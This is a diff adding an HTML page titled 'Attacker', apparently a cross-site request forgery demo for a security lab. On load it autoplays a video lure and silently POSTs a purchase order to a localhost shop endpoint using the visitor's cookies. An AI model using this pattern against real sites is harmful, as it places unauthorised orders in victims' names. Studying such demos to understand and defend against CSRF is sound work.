@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Attacker</title>
+
+    <style>
+        body {
+            font-size: 20px;
+            background: #e1b9b9;
+            text-align:center;
+            margin: 50px 0 0 0;
+        }
+        button {
+            font-size: 30px
+        }
+
+
+    </style>
+</head>
+<body>
+<h1>Attacker 3:)</h1>
+<iframe width="420" height="345"  src="https://www.youtube.com/embed/7yLxxyzGiko?autoplay=1"  allowfullscreen></iframe>
+
+<script>
+    const message = document.getElementById('message');
+    fetch('http://localhost:4000/buy', {
+        method: "POST",
+        body: JSON.stringify({
+            item: 'Attacker injected item',
+            address: 'Attacker injected address'
+        }),
+        headers: {
+            "Content-type": "application/json; charset=UTF-8",
+        },
+        credentials: "include"
+    })
+        .then(response => response.json())
+        .then(data => {
+            message.innerHTML = data.msg
+        });
+</script>
+</body>
+</html>
